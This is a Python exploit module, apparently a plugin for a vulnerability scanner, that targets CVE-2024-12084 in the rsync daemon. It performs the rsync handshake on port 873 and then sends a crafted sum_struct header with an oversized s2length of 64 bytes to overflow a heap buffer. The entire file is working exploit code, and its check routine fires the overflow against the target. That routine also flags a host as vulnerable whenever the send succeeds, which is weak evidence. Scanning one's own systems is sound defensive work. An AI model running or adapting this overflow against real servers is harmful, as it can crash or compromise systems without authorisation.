"""Agent Asteroid implementation for CVE-2024-12084"""

import datetime
import logging
import socket
import struct
import time

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "Rsync Heap Buffer Overflow"
VULNERABILITY_REFERENCE = "CVE-2024-12084"
VULNERABILITY_DESCRIPTION = (
    "A crafted rsync traffic sequence can trigger a heap buffer overflow vulnerability in rsync. "
    "This is achieved by sending a specially constructed sum_struct header with a manipulated s2length value."
)
RISK_RATING = "CRITICAL"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=10)
DEFAULT_RSYNC_PORT = 873
OVERFLOW_S2LENGTH = 64  # Use 64 for SHA256 support, overflowing the 16-byte buffer


def _get_socket(host: str, port: int, timeout: float) -> socket.socket:
    try:
        s = socket.create_connection((host, port), timeout)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        return s
    except (socket.timeout, ConnectionRefusedError, OSError) as error:
        logging.error("Socket connection failed: %s", error)
        raise


def _send_and_receive(
    sock: socket.socket,
    payload: bytes | None,
    expect_resp: bool = True,
    timeout: float = 5.0,
) -> bytes | int:
    if payload is None:
        payload = b""
    try:
        len_sent = sock.send(payload)
        logging.debug("Sent %d bytes: %r", len_sent, payload)
        time.sleep(0.1)  # Small delay after sending
    except OSError as error:
        logging.error("Error sending payload: %s", error)
        raise

    if expect_resp is False:
        return len(payload)

    # Set timeout for receiving
    original_timeout = sock.gettimeout()
    sock.settimeout(timeout)
    bytes_rcvd = bytearray()
    start_time = time.time()
    try:
        while time.time() - start_time < timeout:
            try:
                rcvd = sock.recv(1024)
                if len(rcvd) == 0:
                    break
                bytes_rcvd.extend(rcvd)
                if len(rcvd) < 1024:
                    break
            except socket.timeout:
                break
    except OSError as error:
        logging.error("Error receiving data: %s", error)
        raise
    finally:
        sock.settimeout(original_timeout)
    logging.debug("Received %d bytes: %r", len(bytes_rcvd), bytes_rcvd)
    return bytes(bytes_rcvd)


def _exploit_rsync_target(
    host: str, port: int, module_name: str = "files_anon"
) -> bool:
    try:
        sock = _get_socket(host, port, DEFAULT_TIMEOUT.seconds)
    except (socket.timeout, ConnectionRefusedError, OSError) as error:
        logging.error("Error connecting to target: %s", error)
        return False

    try:
        # Step 1: Initial handshake
        hello_resp = _send_and_receive(sock, b"@RSYNCD: 31.0\n")
        if isinstance(hello_resp, int) or b"@RSYNCD:" not in hello_resp:
            logging.error("Bad response from server initialization: %r", hello_resp)
            return False

        logging.info("Server responded with: %r", hello_resp)

        # Step 2: Send module name and check for OK.
        module_req = f"{module_name}\n".encode()
        mod_resp = _send_and_receive(sock, module_req)
        if isinstance(mod_resp, int) or b"@RSYNCD: OK" not in mod_resp:
            logging.error("Bad response from module request: %r", mod_resp)
            return False

        logging.info("Module response: %r", mod_resp)

        # Step 3: Send a minimal command-line handshake (just a newline)
        _send_and_receive(sock, b"\n", expect_resp=True)
        # Step 4: Terminate file list with a null byte.
        _send_and_receive(sock, b"\x00", expect_resp=False)

        # Step 5: Craft and send the malicious sum_struct payload.
        count = 1
        blength = 700
        s2length = OVERFLOW_S2LENGTH  # Attacker-controlled value
        remainder = 4

        logging.info("Sending sum_struct request with s2length=%d", s2length)
        header = struct.pack("<iiii", count, blength, s2length, remainder)
        malicious_checksum = b"A" * s2length
        sum_payload = header + malicious_checksum
        _send_and_receive(sock, sum_payload)
        # Step 6: Send final payload (no response expected)
        final_payload = b"\xff\xff\xff\xff"
        _send_and_receive(sock, final_payload, expect_resp=False)
        return True
    except (socket.timeout, OSError) as error:
        logging.error("Error during exploitation: %s", error)
        return False
    finally:
        sock.close()


@exploits_registry.register
class RsyncHeapBufferOverflowExploit(webexploit.WebExploit):
    """
    CVE-2024-12084: Rsync Heap Buffer Overflow

    This exploit emulates rsync client traffic to trigger a heap buffer overflow via a
    crafted sum_struct header with a manipulated s2length parameter.
    """

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
        cve_ids=["CVE-2024-12084"],
    )

    def accept(self, target: definitions.Target) -> bool:
        try:
            sock = _get_socket(target.host, DEFAULT_RSYNC_PORT, DEFAULT_TIMEOUT.seconds)
            hello_resp = _send_and_receive(sock, b"@RSYNCD: 31.0\n")
            sock.close()
            return isinstance(hello_resp, bytes) and b"@RSYNCD:" in hello_resp
        except (socket.timeout, ConnectionError, OSError) as error:
            logging.error("Error during accept: %s", error)
            return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        vulnerabilities: list[definitions.Vulnerability] = []
        try:
            success = _exploit_rsync_target(
                target.host, target.port or DEFAULT_RSYNC_PORT, module_name="files_rw"
            )
        except (socket.timeout, ConnectionRefusedError, OSError) as error:
            logging.error("Error in check(): %s", error)
            return vulnerabilities

        if success is True:
            vuln = self.create_vulnerability(target)
            vulnerabilities.append(vuln)
        return vulnerabilities
